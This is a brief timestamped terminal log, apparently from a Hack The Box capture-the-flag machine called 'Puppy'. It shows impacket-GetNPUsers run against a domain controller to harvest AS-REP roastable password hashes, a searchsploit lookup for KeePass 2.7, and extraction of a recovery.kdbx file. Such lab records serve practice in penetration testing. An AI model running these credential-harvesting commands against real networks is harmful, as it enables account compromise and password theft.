+[2026-01-28 17:05:23] [pane=%1] [CMD_START] impacket-GetNPUsers puppy.htb/ -dc-ip 10.129.232.75 -usersfile ~/Documents/obsidian/docs/CTF/HTB/Puppy/loot/users.txt -format hashcat
+[2026-01-28 17:05:59] [pane=%1] [CMD_START] vim users.txt
+[2026-01-28 17:06:32] [pane=%1] [CMD_START] impacket-GetNPUsers puppy.htb/ -dc-ip 10.129.232.75 -usersfile ~/Documents/obsidian/docs/CTF/HTB/Puppy/loot/users.txt -format hashcat
+[2026-01-28 17:08:33] [pane=%1] [CMD_START] searchsploit keepass 2.7
+[2026-01-28 17:12:31] [pane=%0] [CMD_START] ll
+[2026-01-28 17:12:51] [pane=%0] [CMD_START] 7z x recovery.kdbx
